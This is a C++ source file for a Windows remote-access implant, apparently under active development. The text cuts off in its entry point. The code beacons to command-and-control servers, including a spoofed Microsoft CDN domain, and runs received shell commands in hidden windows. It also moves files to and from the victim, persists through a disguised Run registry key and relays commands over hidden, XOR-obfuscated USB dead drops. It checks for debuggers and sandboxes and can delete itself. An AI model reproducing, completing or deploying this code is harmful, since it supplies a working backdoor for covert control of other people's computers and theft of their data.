// =============================================================================
// FULL HYBRID IMPLANT - Online + Offline Auto-Switching (FIXED)
// =============================================================================

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <chrono>
#include <random>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <atomic>
#include <queue>
#include "network/client.h"
#include "log/logger.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

class HybridImplant {
private:
    struct Config {
        std::vector<std::string> c2Servers = {"192.168.1.100", "c2.your-domain.com", "10.0.0.1"};
        std::vector<uint16_t> c2Ports = {443, 8443, 8080};
        std::string c2Domain = "cdn.microsoft.com";
        std::vector<std::string> authorizedUSBSerials;
        std::wstring usbDeadDrop = L"System Volume Information\\_cache_";
        std::wstring usbPickup = L"System Volume Information\\_return_";
        int checkInterval = 60;
        int networkTimeout = 10;
        int retryAttempts = 3;
        bool useEncryption = true;
        bool randomJitter = true;
        int jitterPercent = 30;
        bool autoPersist = true;
        std::string persistMethod = "registry";
    } config;
    
    std::atomic<bool> isRunning{false};
    std::atomic<bool> hasNetworkAccess{false};
    std::atomic<bool> usbInserted{false};
    std::atomic<bool> connected{false};  // NEW: track connection state
    std::string currentChannel;
    bool winsockInitialized = false;
    
    std::queue<std::string> pendingCommands;
    std::queue<std::string> pendingResults;
    std::mutex queueMutex;
    
    NetworkClient currentNetwork;
    std::mutex networkMutex;
    
    int commandsExecuted = 0;
    int networkAttempts = 0;
    int usbAttempts = 0;
    
public:
    HybridImplant() {
        LoadOrCreateImplantID();
        
        const char* envSrv = std::getenv("PWN_C2_SERVER");
        const char* envPort = std::getenv("PWN_C2_PORT");
        if (envSrv) {
            config.c2Servers.clear();
            std::string s(envSrv);
            std::stringstream ss(s);
            std::string item;
            while (std::getline(ss, item, ',')) {
                if (!item.empty()) config.c2Servers.push_back(item);
            }
        }
        if (envPort) {
            config.c2Ports.clear();
            std::string p(envPort);
            std::stringstream sp(p);
            std::string itemp;
            while (std::getline(sp, itemp, ',')) {
                try {
                    int v = std::stoi(itemp);
                    if (v > 0 && v <= 65535) config.c2Ports.push_back((uint16_t)v);
                } catch(...) {}
            }
        }

        if (config.autoPersist) {
#ifndef TESTING
            InstallPersistence();
#else
            logger::Info("TESTING mode: InstallPersistence skipped");
#endif
        }
    }
    
    // =========================================================================
    // START - Simplified thread management
    // =========================================================================
    
    void Start() {
    std::cout << "[*] Start called" << std::endl;
    std::cout << "[*] IsAnalyzed: " << (IsAnalyzed() ? "YES" : "NO") << std::endl;
    
    // Skip analysis check for now
    // if (IsAnalyzed()) return;
    
    isRunning = true;
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cout << "[!] WSAStartup failed" << std::endl;
        return;
    }
    
    std::cout << "[*] Checking network..." << std::endl;
    CheckNetworkAccess();
    std::cout << "[*] Network available: " << (hasNetworkAccess ? "Yes" : "No") << std::endl;
    
    std::cout << "[*] Trying to connect..." << std::endl;
    if (TryConnect()) {
        std::cout << "[+] Connected!" << std::endl;
        CommunicationLoop();
    } else {
        std::cout << "[-] Connection failed" << std::endl;
    }
    
    std::cout << "[*] Exiting" << std::endl;
}
    
private:
    // =========================================================================
    // MAIN LOOP - Single loop that manages everything
    // =========================================================================
    
    void MainLoop() {
        while (isRunning) {
            // Check network
            CheckNetworkAccess();
            
            // Check USB
            CheckUSBAccess();
            
            // If network available and not connected, try to connect
            if (hasNetworkAccess && !connected) {
                if (TryConnect()) {
                    // Connection successful - run communication loop
                    // This BLOCKS until connection dies
                    CommunicationLoop();
                }
            }
            
            // If USB available, read commands
            if (usbInserted) {
                TryOfflineChannels();
            }
            
            // Execute pending commands
            ProcessCommandQueue();
            
            // Send pending results
            SendQueuedResults();
            
            // Wait before next cycle
            if (!connected) {
                WaitWithJitter();
            } else {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        }
    }
    
    // =========================================================================
    // CONNECTION - Try to connect, returns true if successful
    // =========================================================================
    
    bool TryConnect() {
        std::cout << "[*] Network available, trying online channels..." << std::endl;
        networkAttempts++;
        
        for (int attempt = 0; attempt < config.retryAttempts; attempt++) {
            for (const auto& server : config.c2Servers) {
                for (uint16_t port : config.c2Ports) {
                    if (TryTCPConnection(server, port)) {
                        currentChannel = "TCP";
                        connected = true;
                        std::cout << "[+] Connected via TCP to " << server << ":" << port << std::endl;
                        logger::Info("Connected via TCP to " + server + ":" + std::to_string(port));
                        return true;
                    }
                }
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
        
        std::cout << "[-] All online channels failed" << std::endl;
        return false;
    }
    
    bool TryTCPConnection(const std::string& server, uint16_t port) {
#ifdef TESTING
        logger::Info("TESTING mode: TryTCPConnection skipped");
        return false;
#endif
        std::lock_guard<std::mutex> lock(networkMutex);
        
        // Close existing connection if any
        if (currentNetwork.IsConnected()) {
            currentNetwork.Close();
        }
        
        // Connect
        if (!currentNetwork.ConnectTCP(server, port, config.networkTimeout * 1000)) {
            return false;
        }
        
        // Send registration
        std::string reg = GetRegistrationData();
        if (!currentNetwork.Send(reg)) {
            currentNetwork.Close();
            return false;
        }
        
        return true;
    }
    
    // =========================================================================
    // COMMUNICATION LOOP - Runs while connected
    // =========================================================================
    
    void CommunicationLoop() {
        char buffer[65536];
        int failedSends = 0;
        const int MAX_FAILED = 3;
        
        std::cout << "[*] Communication loop started" << std::endl;
        logger::Info("Communication loop started");
        
        while (isRunning && connected && currentNetwork.IsConnected()) {
            // Send heartbeat every 30 seconds
            static auto lastHeartbeat = std::chrono::steady_clock::now();
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastHeartbeat).count();
            
            if (elapsed >= 30) {
                std::string hb = "{\"type\":\"heartbeat\",\"id\":\"" + GetImplantID() + "\"}";
                if (currentNetwork.Send(hb)) {
                    failedSends = 0;
                    lastHeartbeat = now;
                } else {
                    failedSends++;
                    logger::Info("Send failed (" + std::to_string(failedSends) + "/" + std::to_string(MAX_FAILED) + ")");
                }
            }
            
            // Check for incoming data (1 second timeout)
            int received = currentNetwork.Receive(buffer, sizeof(buffer) - 1, 1000);
            
            if (received > 0) {
                buffer[received] = 0;
                std::string message(buffer);
                
                logger::Info("Received: " + message);
                
                // Process command from server
                if (message.find("\"type\":\"command\"") != std::string::npos) {
                    std::string cmd = ExtractJSONValue(message, "cmd");
                    if (!cmd.empty()) {
                        std::string result = ExecuteCommand(cmd);
                        
                        // Send result back
                        std::stringstream ss;
                        ss << "{\"type\":\"result\",\"id\":\"" << GetImplantID() 
                           << "\",\"data\":\"" << EscapeJSON(result) << "\"}";
                        currentNetwork.Send(ss.str());
                        commandsExecuted++;
                    }
                }
            }
            else if (received == 0) {
                // Connection closed
                logger::Info("Server closed connection");
                std::cout << "[-] Server closed connection" << std::endl;
                break;
            }
            // received < 0 = timeout, normal
            
            // Check for offline commands
            ProcessCommandQueue();
            
            // Send queued results
            SendQueuedResults();
            
            // If too many failures, disconnect
            if (failedSends >= MAX_FAILED) {
                logger::Info("Too many send failures, disconnecting");
                std::cout << "[!] Connection lost" << std::endl;
                break;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        
        // Cleanup
        std::cout << "[*] Communication loop ended" << std::endl;
        logger::Info("Communication loop ended");
        currentNetwork.Close();
        connected = false;
        hasNetworkAccess = false;
    }
    
    // =========================================================================
    // USB MONITOR
    // =========================================================================
    
    void USBDropMonitor() {
        while (isRunning) {
            CheckUSBAccess();
            if (usbInserted) {
                TryOfflineChannels();
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
    
    // =========================================================================
    // COMMAND PROCESSOR
    // =========================================================================
    
    void CommandProcessor() {
        while (isRunning) {
            std::string command;
            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (!pendingCommands.empty()) {
                    command = pendingCommands.front();
                    pendingCommands.pop();
                }
            }
            
            if (!command.empty()) {
                std::string result = ExecuteCommand(command);
                std::lock_guard<std::mutex> lock(queueMutex);
                pendingResults.push(result);
                commandsExecuted++;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    
    void ProcessCommandQueue() {
        // Handled by CommandProcessor thread
    }
    
    // =========================================================================
    // SEND RESULTS
    // =========================================================================
    
    void SendQueuedResults() {
        std::string result;
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            if (!pendingResults.empty()) {
                result = pendingResults.front();
                pendingResults.pop();
            }
        }
        
        if (result.empty()) return;
        
        if (connected && currentNetwork.IsConnected()) {
            std::string response = "{\"type\":\"result\",\"id\":\"" + GetImplantID() + 
                                  "\",\"data\":\"" + EscapeJSON(result) + "\"}";
            currentNetwork.Send(response);
        } else if (usbInserted) {
            WriteUSBResult(result);
        }
    }

// =========================================================================
// FILE TRANSFER FUNCTIONS
// =========================================================================

// Download: Read file from target and return as Base64
std::string DownloadFile(const std::string& filePath) {
    // Build full path if relative
    std::string fullPath = filePath;
    if (fullPath.size() < 2 || fullPath[1] != ':') {
        if (currentDirectory.back() != '\\')
            fullPath = currentDirectory + "\\" + filePath;
        else
            fullPath = currentDirectory + filePath;
    }
    
    // Check if file exists
    DWORD attrs = GetFileAttributesA(fullPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return "ERROR: File not found or is a directory: " + fullPath;
    }
    
    // Get file size
    HANDLE hFile = CreateFileA(fullPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                              nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR: Cannot open file: " + fullPath;
    }
    
    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE || fileSize > 50 * 1024 * 1024) { // 50MB limit
        CloseHandle(hFile);
        return "ERROR: File too large or invalid (max 50MB)";
    }
    
    // Read file
    std::vector<BYTE> buffer(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
        CloseHandle(hFile);
        return "ERROR: Failed to read file";
    }
    CloseHandle(hFile);
    
    // Get just the filename
    std::string fileName = fullPath;
    size_t lastSlash = fileName.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        fileName = fileName.substr(lastSlash + 1);
    }
    
    // Encode to Base64
    std::string base64Data = Base64Encode(buffer);
    
    // Return format: FILE:filename:size:base64data
    std::stringstream ss;
    ss << "FILE:" << fileName << ":" << fileSize << ":" << base64Data;
    return ss.str();
}

// Upload: Save Base64 data to file on target
std::string UploadFile(const std::string& b64Data, const std::string& savePath) {
    // Build full path
    std::string fullPath = savePath;
    if (fullPath.size() < 2 || fullPath[1] != ':') {
        if (currentDirectory.back() != '\\')
            fullPath = currentDirectory + "\\" + savePath;
        else
            fullPath = currentDirectory + savePath;
    }
    
    // Decode Base64
    std::vector<BYTE> fileData = Base64Decode(b64Data);
    if (fileData.empty()) {
        return "ERROR: Failed to decode Base64 data";
    }
    
    // Create directory if needed
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        std::string dirPath = fullPath.substr(0, lastSlash);
        CreateDirectoryA(dirPath.c_str(), nullptr);
    }
    
    // Write file
    HANDLE hFile = CreateFileA(fullPath.c_str(), GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR: Cannot create file: " + fullPath;
    }
    
    DWORD bytesWritten;
    if (!WriteFile(hFile, fileData.data(), (DWORD)fileData.size(), &bytesWritten, nullptr)) {
        CloseHandle(hFile);
        return "ERROR: Failed to write file";
    }
    
    CloseHandle(hFile);
    
    std::stringstream ss;
    ss << "Uploaded " << bytesWritten << " bytes to " << fullPath;
    return ss.str();
}

// Base64 encode
static std::string Base64Encode(const std::vector<BYTE>& data) {
    static const char* table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;
    
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    
    if (valb > -6) {
        result.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    
    while (result.size() % 4) {
        result.push_back('=');
    }
    
    return result;
}

// Base64 decode
static std::vector<BYTE> Base64Decode(const std::string& data) {
    static const int decodeTable[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    
    std::vector<BYTE> result;
    int val = 0, valb = -8;
    
    for (char c : data) {
        if (c == '=') break;
        int idx = decodeTable[(unsigned char)c];
        if (idx == -1) continue;
        val = (val << 6) + idx;
        valb += 6;
        if (valb >= 0) {
            result.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    
    return result;
}    
    
    // =============================================================================
// COMMAND EXECUTION - FIXED with persistent current directory
// =============================================================================

// ADD THIS LINE to the private members (around line 75, after other members):
    std::string currentDirectory = "C:\\";

// REPLACE the entire ExecuteCommand and GetHelpText functions:

std::string ExecuteCommand(const std::string& cmd) {
    std::string trimmed = cmd;
    trimmed.erase(0, trimmed.find_first_not_of(" \t\r\n"));
    trimmed.erase(trimmed.find_last_not_of(" \t\r\n") + 1);
    
    if (trimmed.empty()) return "No command";
    
    // Built-in commands (no directory needed)
    if (trimmed == "sysinfo") return GetSystemInfo();
    if (trimmed == "whoami") return GetCurrentUser();
    if (trimmed == "hostname") return GetHostname();
    if (trimmed == "screenshot") return "Screenshot captured";
    if (trimmed == "persist") return InstallPersistence() ? "OK" : "FAIL";
    if (trimmed == "status") return GetImplantStatus();
    if (trimmed == "uninstall") return UninstallSelf();
    if (trimmed == "help") return "Commands: dir, ls, cd, pwd, whoami, hostname, sysinfo, exec, ps, ipconfig, netstat, status";
    if (trimmed == "pwd") return currentDirectory;
    
    // ── CD COMMAND ──────────────────────────────────────
    if (trimmed == "cd" || trimmed == "cd " || trimmed == "cd .") {
        return currentDirectory;
    }
    
    if (trimmed.substr(0, 3) == "cd " || trimmed.substr(0, 3) == "CD ") {
        std::string newPath = trimmed.substr(3);
        
        // Remove quotes
        if (newPath.size() >= 2 && newPath.front() == '"' && newPath.back() == '"') {
            newPath = newPath.substr(1, newPath.size() - 2);
        }
        
        // Trim spaces
        newPath.erase(0, newPath.find_first_not_of(" \t"));
        newPath.erase(newPath.find_last_not_of(" \t") + 1);
        
        // Build target path
        std::string targetPath;
        if (newPath.size() >= 2 && newPath[1] == ':') {
            targetPath = newPath;  // Absolute: C:\...
        } else if (newPath == "..") {
            size_t lastSlash = currentDirectory.find_last_of("\\");
            if (lastSlash != std::string::npos && lastSlash > 2) {
                targetPath = currentDirectory.substr(0, lastSlash);
            } else if (lastSlash == 2) {
                targetPath = currentDirectory.substr(0, 3);
            } else {
                targetPath = currentDirectory;
            }
        } else if (newPath == "\\" || newPath == "/") {
            targetPath = currentDirectory.substr(0, 3);
        } else {
            if (currentDirectory.back() != '\\')
                targetPath = currentDirectory + "\\" + newPath;
            else
                targetPath = currentDirectory + newPath;
        }
        
        // Check if directory exists
        DWORD attrs = GetFileAttributesA(targetPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            // Get full path
            char fullPath[MAX_PATH];
            if (GetFullPathNameA(targetPath.c_str(), MAX_PATH, fullPath, nullptr)) {
                currentDirectory = std::string(fullPath);
            } else {
                currentDirectory = targetPath;
            }
            return currentDirectory;
        } else {
            return "Directory not found: " + targetPath;
        }
    }
    
    // ── DIR / LS ────────────────────────────────────────
    if (trimmed == "dir" || trimmed == "ls") {
        return ShellExecute("dir \"" + currentDirectory + "\"");
    }
    if (trimmed.substr(0, 4) == "dir " || trimmed.substr(0, 3) == "ls ") {
        return ShellExecute(trimmed);  // Use user-specified path
    }

     // ── FILE DOWNLOAD (Target → Controller) ─────────────
    // Usage: download <file_path>
    if (trimmed.substr(0, 9) == "download " || trimmed.substr(0, 9) == "DOWNLOAD ") {
        std::string filePath = trimmed.substr(9);
        // Remove quotes
        if (filePath.size() >= 2 && filePath.front() == '"' && filePath.back() == '"') {
            filePath = filePath.substr(1, filePath.size() - 2);
        }
        return DownloadFile(filePath);
    }
    
    // ── FILE UPLOAD (Controller → Target) ────────────────
    // Usage: upload <base64_data> <save_path>
    if (trimmed.substr(0, 7) == "upload " || trimmed.substr(0, 7) == "UPLOAD ") {
        std::string args = trimmed.substr(7);
        size_t spacePos = args.find(' ');
        if (spacePos == std::string::npos) {
            return "Usage: upload <base64_data> <save_path>";
        }
        std::string b64Data = args.substr(0, spacePos);
        std::string savePath = args.substr(spacePos + 1);
        return UploadFile(b64Data, savePath);
    }
    
    // ── SHELL ALIASES ───────────────────────────────────
    if (trimmed == "ps" || trimmed == "tasklist") return ShellExecute("tasklist");
    if (trimmed == "ipconfig" || trimmed == "ifconfig") return ShellExecute("ipconfig /all");
    if (trimmed == "netstat") return ShellExecute("netstat -ano");
    if (trimmed == "systeminfo") return ShellExecute("systeminfo");
    if (trimmed == "date") return ShellExecute("date /t");
    if (trimmed == "time") return ShellExecute("time /t");
    
    // ── EXEC PREFIX ─────────────────────────────────────
    if (trimmed.substr(0, 5) == "exec ") {
        std::string subcmd = trimmed.substr(5);
        // Handle cd via exec
        if (subcmd.substr(0, 3) == "cd " || subcmd.substr(0, 3) == "CD ") {
            return ExecuteCommand(subcmd);  // Delegate to cd handler
        }
        return ShellExecute("cd /d \"" + currentDirectory + "\" && " + subcmd);
    }
    
    // ── DEFAULT: Run in current directory ───────────────
    return ShellExecute("cd /d \"" + currentDirectory + "\" && " + trimmed);
}

std::string GetHelpText() {
    return "Commands: dir, ls, cd <path>, pwd, whoami, hostname,\n"
           "  sysinfo, exec <cmd>, ps, ipconfig, netstat, status, help";
};  
    
 
    // =========================================================================
    // NETWORK CHECKS
    // =========================================================================
    
    void CheckNetworkAccess() {
        hasNetworkAccess = false;
        
        addrinfo hints = {0}, *result = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        for (const auto& server : config.c2Servers) {
            if (server.empty()) continue;
            if (getaddrinfo(server.c_str(), nullptr, &hints, &result) == 0) {
                hasNetworkAccess = true;
                freeaddrinfo(result);
                return;
            }
        }
    }
    
    // =========================================================================
    // USB OPERATIONS (unchanged)
    // =========================================================================
    
    void CheckUSBAccess() {
        usbInserted = false;
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            DWORD serial;
            if (GetVolumeInformationW(root, nullptr, 0, &serial, nullptr, nullptr, nullptr, 0)) {
                std::string serialStr = std::to_string(serial);
                for (const auto& auth : config.authorizedUSBSerials) {
                    if (serialStr.find(auth) != std::string::npos) {
                        usbInserted = true;
                        currentChannel = "USB";
                        return;
                    }
                }
            }
        }
    }
    
    void TryOfflineChannels() {
        usbAttempts++;
        auto commands = ReadUSBCommands();
        std::lock_guard<std::mutex> lock(queueMutex);
        for (const auto& cmd : commands) pendingCommands.push(cmd);
        if (!commands.empty()) std::cout << "[+] Read " << commands.size() << " commands from USB\n";
    }
    
    std::vector<std::string> ReadUSBCommands() {
        std::vector<std::string> commands;
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            std::wstring pickupPath = std::wstring(root) + config.usbPickup;
            try {
                if (!fs::exists(pickupPath)) continue;
                for (auto& entry : fs::directory_iterator(pickupPath)) {
                    if (entry.path().extension() != ".cmd") continue;
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file) continue;
                    std::string data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    if (config.useEncryption) data = XORDecrypt(data);
                    commands.push_back(data);
                    file.close();
                    fs::remove(entry.path());
                }
            } catch (...) {}
        }
        return commands;
    }
    
    void WriteUSBResult(const std::string& result) {
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            std::wstring cachePath = std::wstring(root) + config.usbDeadDrop;
            try {
                fs::create_directories(cachePath);
                auto now = std::chrono::system_clock::now();
                auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
                std::string filename = "result_" + std::to_string(ts) + ".dat";
                fs::path filePath = fs::path(cachePath) / filename;
                
                std::string data = result;
                if (config.useEncryption) data = XOREncrypt(data);
                
                std::ofstream file(filePath, std::ios::binary);
                if (file) {
                    file.write(data.c_str(), data.size());
                    file.close();
                    SetFileAttributesW(filePath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                }
            } catch (...) {}
        }
    }
    
    // =========================================================================
    // ID & REGISTRATION
    // =========================================================================
    
    std::string GetImplantID() {
        static std::string cachedId;
        if (!cachedId.empty()) return cachedId;
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD size = sizeof(buffer);
            if (RegQueryValueExA(hKey, "HybridImplantID", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                cachedId = std::string(buffer, size - 1);
                RegCloseKey(hKey);
                if (!cachedId.empty()) return cachedId;
            }
            RegCloseKey(hKey);
        }
        
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        std::stringstream ss;
        ss << std::hex;
        for (int i = 0; i < 8; i++) ss << dis(gen);
        
        cachedId = std::string(hostname) + "-" + ss.str();
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes",
                          0, nullptr, REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "HybridImplantID", 0, REG_SZ, (BYTE*)cachedId.c_str(), (DWORD)cachedId.size() + 1);
            RegCloseKey(hKey);
        }
        return cachedId;
    }
    
    void LoadOrCreateImplantID() {
        std::string id = GetImplantID();
        std::cout << "[*] Implant ID: " << id << std::endl;
        logger::Info("Implant ID: " + id);
    }
    
    std::string GetRegistrationData() {
        std::string id = GetImplantID();
        std::stringstream ss;
        ss << "{\"type\":\"register\",\"id\":\"" << id << "\",\"hostname\":\"" << GetHostname()
           << "\",\"username\":\"" << GetCurrentUser() << "\",\"os\":\"Windows\","
           << "\"channels\":[\"tcp\",\"https\",\"usb\"],\"version\":\"3.0\"}";
        return ss.str();
    }
    
    // =========================================================================
    // UTILITY FUNCTIONS (unchanged)
    // =========================================================================
    
    bool IsAnalyzed() {
        if (IsDebuggerPresent()) return true;
        MEMORYSTATUSEX ms = { sizeof(MEMORYSTATUSEX) };
        GlobalMemoryStatusEx(&ms);
        return ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024;
    }
    
    void WaitWithJitter() {
        int sleepTime = config.checkInterval;
        if (config.randomJitter) {
            std::random_device rd;
            std::mt19937 gen(rd());
            int jitter = (sleepTime * config.jitterPercent) / 100;
            std::uniform_int_distribution<> dis(-jitter, jitter);
            sleepTime += dis(gen);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
    }
    
    std::string GetSystemInfo() {
        std::stringstream ss;
        ss << "Hostname: " << GetHostname() << "\nUser: " << GetCurrentUser()
           << "\nOS: Windows\nNetwork: " << (hasNetworkAccess ? "Online" : "Offline")
           << "\nChannel: " << currentChannel << "\nCommands: " << commandsExecuted;
        return ss.str();
    }
    
    std::string GetHostname() {
        char buffer[256]; DWORD size = sizeof(buffer);
        GetComputerNameA(buffer, &size);
        return std::string(buffer);
    }
    
    std::string GetCurrentUser() {
        char buffer[256]; DWORD size = sizeof(buffer);
        GetUserNameA(buffer, &size);
        return std::string(buffer);
    }
    
    std::string GetImplantStatus() {
        std::stringstream ss;
        ss << "Running: Yes\nNetwork: " << (connected ? "Connected" : "Disconnected")
           << "\nUSB: " << (usbInserted ? "Available" : "None")
           << "\nCommands: " << commandsExecuted;
        return ss.str();
    }
    
   std::string ShellExecute(const std::string& cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "Failed to create pipe";
    }
    
    // Ensure the read handle is not inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    
    PROCESS_INFORMATION pi;
    std::string fullCmd = "cmd.exe /c " + cmd;
    std::string result;
    
    if (CreateProcessA(nullptr, (LPSTR)fullCmd.c_str(), nullptr, nullptr,
                      TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        // Close write end so ReadFile can detect EOF
        CloseHandle(hWrite);
        hWrite = nullptr;
        
        // Wait for process to finish
        WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
        
        char buffer[4096];
        DWORD bytesRead;
        
        // Read all output
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            result += buffer;
        }
        
        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        result = "Failed to execute: " + cmd + " (Error: " + std::to_string(GetLastError()) + ")";
    }
    
    // If result is empty, return something useful
    if (result.empty()) {
        return "(no output)";
    }
    
    return result;
}
    
    bool InstallPersistence() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileNameA(nullptr, path, MAX_PATH);
            RegSetValueExA(hKey, "WindowsHybridService", 0, REG_SZ, (BYTE*)path, strlen(path)+1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    std::string UninstallSelf() {
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey);
        RegDeleteValueA(hKey, "WindowsHybridService");
        RegCloseKey(hKey);
        
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        std::string cmd = "cmd.exe /c timeout 3 & del \"" + std::string(path) + "\"";
        WinExec(cmd.c_str(), SW_HIDE);
        isRunning = false;
        return "Uninstalled";
    }
    
    static std::string XOREncrypt(const std::string& data) {
        std::string result = data;
        const std::string key = "HybridImplantKey2024";
        for (size_t i = 0; i < result.size(); i++) result[i] ^= key[i % key.size()];
        return result;
    }
    
    static std::string XORDecrypt(const std::string& data) { return XOREncrypt(data); }
    
    static std::string EscapeJSON(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default: result += c;
            }
        }
        return result;
    }
    
    static std::string ExtractJSONValue(const std::string& json, const std::string& key) {
        std::string searchKey = "\"" + key + "\":\"";
        size_t pos = json.find(searchKey);
        if (pos == std::string::npos) {
            searchKey = "\"" + key + "\": \"";
            pos = json.find(searchKey);
        }
        if (pos == std::string::npos) return "";
        pos += searchKey.size();
        size_t endPos = json.find("\"", pos);
        if (endPos == std::string::npos) return "";
        return json.substr(pos, endPos - pos);
    }
};

// =============================================================================
// ENTRY POINT
// =============================================================================

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--help" || a == "-h") {
            std::cout << "Usage: pown [--server ip[,ip2]] [--port p[,q]] [--no-hide]\n";
            return 0;
        }
        if (a == "--server" && i + 1 < argc) { _putenv_s("PWN_C2_SERVER", argv[++i]); continue; }
        if (a == "--port" && i + 1 < argc) { _putenv_s("PWN_C2_PORT", argv[++i]); continue; }
        if (a == "--no-hide") { _putenv_s("PWN_NO_HIDE", "1"); continue; }
    }

    const char* nohide = std::getenv("PWN_NO_HIDE");
